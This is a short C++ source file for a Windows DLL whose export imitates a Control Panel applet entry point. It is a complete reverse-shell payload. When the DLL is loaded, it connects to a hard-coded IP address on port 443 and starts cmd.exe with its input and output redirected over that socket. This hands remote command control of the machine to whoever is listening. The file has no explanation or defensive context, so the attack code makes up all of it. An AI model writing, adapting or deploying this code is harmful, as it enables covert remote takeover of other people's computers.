#include <Windows.h>

extern "C" __declspec(dllexport) LONG Main(
	HWND hwndCpl,
	UINT msg,
	LPARAM lParam1,
	LPARAM lParam2
)
{

      WSADATA wsaData;
      SOCKET s1;
      struct sockaddr_in hax;
      char ip_addr[16];
      STARTUPINFO sui;
      PROCESS_INFORMATION pi;
      hax.sin_family = AF_INET;
      hax.sin_port = htons(443);
      hax.sin_addr.s_addr = inet_addr("87.57.141.215");
      WSAStartup(MAKEWORD(2, 2), &wsaData);
      s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
      WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
      memset(&sui, 0, sizeof(sui));
      sui.cb = sizeof(sui);
      sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
      sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
      TCHAR commandLine[256] = "cmd.exe";
      CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
      return 1;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
	  Main(NULL, NULL, NULL, NULL);
	}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}